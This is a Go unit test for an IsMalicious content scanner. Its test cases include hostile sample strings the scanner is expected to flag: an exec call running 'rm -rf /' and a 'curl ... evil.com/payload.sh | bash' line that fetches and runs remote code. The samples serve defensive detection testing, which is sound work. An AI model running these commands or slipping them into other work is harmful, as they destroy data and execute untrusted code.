package analyzer

import (
	"testing"
)

func TestIsMalicious(t *testing.T) {
	tests := []struct {
		name     string
		content  []byte
		expected bool
	}{
		{
			name:     "Benign content",
			content:  []byte("This is a normal file content."),
			expected: false,
		},
		{
			name:     "Suspicious keyword 'eval'",
			content:  []byte("eval(some_code)"),
			expected: true,
		},
		{
			name:     "Suspicious keyword 'exec'",
			content:  []byte("os.exec('rm -rf /')"),
			expected: true,
		},
		{
			name:     "Base64 encoded string",
			content:  []byte("YmFzZTY0IGlzIG5vdCBpbhlcmVudGx5IGV2aWw="),
			expected: false, // Simple base64 is not enough to be malicious
		},
        {
			name:     "Suspicious url download",
			content:  []byte("curl -s http://evil.com/payload.sh | bash"),
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := IsMalicious(tt.content); got != tt.expected {
				t.Errorf("IsMalicious() = %v, want %v", got, tt.expected)
			}
		})
	}
}
